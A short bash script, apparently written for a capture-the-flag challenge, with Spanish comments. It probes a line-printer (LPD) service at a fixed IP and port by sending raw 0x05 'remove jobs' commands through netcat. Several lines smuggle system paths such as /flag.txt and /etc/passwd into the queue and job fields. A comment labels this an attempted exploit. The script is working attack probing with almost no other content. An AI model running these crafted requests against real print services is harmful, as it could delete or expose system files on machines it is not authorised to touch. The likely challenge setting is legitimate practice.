#!/bin/bash
TARGET="94.237.49.23"
PORT="37326"

# Comando 0x05: Remove jobs
# Formato: 0x05 + queue + space + agent + space + job_list

echo "=== Test 0x05: Remove con diferentes parámetros ==="
echo -ne "\x05lp root\n" | timeout 3s nc $TARGET $PORT | xxd
echo ""

echo -ne "\x05lp root 1\n" | timeout 3s nc $TARGET $PORT | xxd
echo ""

echo -ne "\x05lp\n" | timeout 3s nc $TARGET $PORT | xxd
echo ""

# Intentar "remover" archivos del sistema (exploit potencial)
echo "=== Test 0x05: Con paths del sistema ==="
echo -ne "\x05lp root /flag.txt\n" | timeout 3s nc $TARGET $PORT
echo ""

echo -ne "\x05/etc/passwd root 1\n" | timeout 3s nc $TARGET $PORT
echo ""